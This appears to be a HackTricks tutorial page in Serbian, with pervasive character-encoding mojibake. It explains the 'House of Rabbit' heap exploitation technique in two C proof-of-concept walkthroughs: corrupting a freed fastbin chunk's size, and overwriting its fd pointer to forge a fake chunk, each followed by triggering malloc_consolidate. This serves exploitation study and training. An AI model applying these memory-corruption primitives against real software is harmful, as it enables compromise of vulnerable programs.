# KuÄ‡a zeÄeva

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**PorodiÄu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### Zahtevi

1. **Sposobnost modifikacije pokazivaÄa fd ili veliÄine fast bin-a**: To znaÄi da moÅ¾ete promeniti pokazivaÄ napred za deo u fastbin-u ili njegovu veliÄinu.
2. **Sposobnost pokretanja `malloc_consolidate`**: Ovo se moÅ¾e postiÄ‡i ili alociranjem velikog dela ili spajanjem vrÅ¡nog dela, Å¡to prisiljava hip da konsoliduje delove.

### Ciljevi

1. **Stvaranje preklapajuÄ‡ih delova**: Da bi jedan deo prekrio drugi, omoguÄ‡avajuÄ‡i dalje manipulacije hipom.
2. **Forgeovanje laÅ¾nih delova**: Da bi prevarili alokator da tretira laÅ¾ni deo kao legitimni deo tokom operacija hipa.

## Koraci napada

### POC 1: Modifikacija veliÄine fast bin dela

**Cilj**: Stvaranje preklapajuÄ‡eg dela manipulacijom veliÄine fastbin dela.

* **Korak 1: Alokacija Delova**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Korak 2: OslobaÄ‘anje Chunk-ova**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Korak 3: Izmena VeliÄine Bloka**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Korak 4: Izazovite `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Alociranje velikog bloka pokreÄ‡e funkciju `malloc_consolidate`, spajajuÄ‡i male blokove u brzom binu. Manipulisana veliÄina `chunk1` uzrokuje preklapanje sa `chunk2`.

Nakon konsolidacije, `chunk1` se preklapa sa `chunk2`, omoguÄ‡avajuÄ‡i daljnju eksploataciju.

### POC 2: Modifikacija `fd` pokazivaÄa

**Cilj**: Kreiranje laÅ¾nog bloka manipulacijom brzog bin `fd` pokazivaÄa.

* **Korak 1: Alociranje Blokova**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**ObjaÅ¡njenje**: Alociramo dva bloka, jedan manji i jedan veÄ‡i, kako bismo postavili hip za laÅ¾ni blok.

* **Korak 2: Kreiranje laÅ¾nog bloka**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Korak 3: OslobaÄ‘anje `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**ObjaÅ¡njenje**: OslobaÄ‘amo `chunk1`, dodajuÄ‡i ga u listu fastbin.

* **Korak 4: Modifikujemo `fd` od `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**ObjaÅ¡njenje**: Menjamo pokazivaÄ unapred (`fd`) `chunk1` da pokazuje na naÅ¡ laÅ¾ni blok unutar `chunk2`.

* **Korak 5: Pokretanje `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Alociranje velikog bloka ponovo pokreÄ‡e `malloc_consolidate`, koji obraÄ‘uje laÅ¾ni blok.

LaÅ¾ni blok postaje deo liste brzih blokova, ÄineÄ‡i ga legitimnim blokom za dalje iskoriÅ¡Ä‡avanje.

### Rezime

Tehnika **House of Rabbit** ukljuÄuje ili modifikovanje veliÄine brzog bin bloka kako bi se stvorili preklapajuÄ‡i blokovi ili manipulisanje `fd` pokazivaÄa kako bi se stvorili laÅ¾ni blokovi. Ovo omoguÄ‡ava napadaÄima da falsifikuju legitimne blokove u hipu, omoguÄ‡avajuÄ‡i razliÄite oblike iskoriÅ¡Ä‡avanja. Razumevanje i veÅ¾banje ovih koraka Ä‡e unaprediti vaÅ¡e veÅ¡tine iskoriÅ¡Ä‡avanja hipa.
